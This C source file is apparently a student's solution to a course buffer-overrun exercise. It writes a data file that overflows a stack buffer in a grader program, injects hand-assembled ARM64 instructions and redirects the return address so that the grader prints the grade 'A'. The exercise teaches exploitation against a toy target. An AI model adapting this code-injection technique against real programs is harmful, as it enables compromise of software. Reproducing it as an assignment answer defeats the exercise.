/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* by Andy Nguyen and Icey Ai                                         */
/*--------------------------------------------------------------------*/
#include <stdio.h>
#include "miniassembler.h"

/*--------------------------------------------------------------------*/
/* creates and writes to a file named "dataA"                         */
/* does not take inputs                                               */
/* writes to file "dataA" using fprintf and fwrite                    */
/* "dataA" is used to perform a buffer overrun on the grader.c file   */
/*      to print out "A" as the grade.                                */
/*--------------------------------------------------------------------*/

int main(void) {

    unsigned int instr;
    int i;
    FILE *file;
    file = fopen("dataA", "w");

    /* Writes our names into the file */
    fprintf(file, "Andy & Icey");
    putc(0, file);

    /* 0x400858 <+main56>:          mov     w0, #0x42 buf[12]-buf[15]*/
    instr = MiniAssembler_mov(0, 'A');
    fwrite(&instr, sizeof(unsigned int), 1, file);

    /* 0x40085c <main+60>:          adrp    x1, 0x420000 buf[16]-buf[19] */
    instr = MiniAssembler_adr(1, 0x420044, 0x420068);
    fwrite(&instr, sizeof(unsigned int), 1, file);

    /* 0x400860 <main+64>:          strb    w0, [x1, #68] buf[20]-buf[23]*/
    instr = MiniAssembler_strb(0, 1);
    fwrite(&instr, sizeof(unsigned int), 1, file);

    /* branch back to printf buf[24]-buf[27]*/
    instr = MiniAssembler_b(0x400864, 0x420070);
    fwrite(&instr, sizeof(unsigned int), 1, file);

    /* fill rest of buf */
    for (i = 0; i < 20; i++)
        putc(0, file);

    /* goto buf[12] */
    instr = 0x420064;
    fwrite(&instr, sizeof(unsigned int), 1, file);

    fclose(file);
    return 0;
}